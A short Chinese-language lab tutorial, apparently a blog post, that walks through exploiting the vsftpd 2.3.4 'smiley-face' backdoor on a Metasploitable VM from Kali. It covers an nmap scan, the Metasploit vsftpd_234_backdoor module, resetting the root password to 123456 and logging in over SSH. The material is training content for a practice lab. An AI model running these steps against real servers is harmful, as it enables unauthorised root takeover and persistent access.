linux笑脸漏洞

要靶机的可以加我QQ，qq号在我主页有 备注来由
渗透机为:kali
靶机为:metasploitable-Linux
kali攻击linux
1.首先nmap 扫描一下开放的端口

如图可以看出开放21端口和22端口等等一些端口

21端口版本为vsftpd 2.3.4

2.利用笑脸漏洞对linux进行攻击
msfconsole 启动metasploit

3.搜索vsftpd的模块

search vsftpd

4.
use exploit/unix/ftp/vsftpd_234_backdoor #进行利用模块

5.show options 查看一下需要配置的
#我这里已经配置好ip了

6.进行攻击 run

7.修改一下密码
passwd root
Enter new UNIX password: 123456 #输入新的密码 123456
Retype new UNIX password: 123456 #重新输入新的密码 123456
passwd: password updated successfully #设置成功

8.重新开一个终端 进行ssh匿名连接
ssh 192.168.32.131 #192.168.32.131为靶机的ip
第一次输入之后会回单出一个对话框 输入yes 就行
然后 在 root@192.168.32.131‘s password: 输入123456 进行连接

连接上去也就攻击进去了
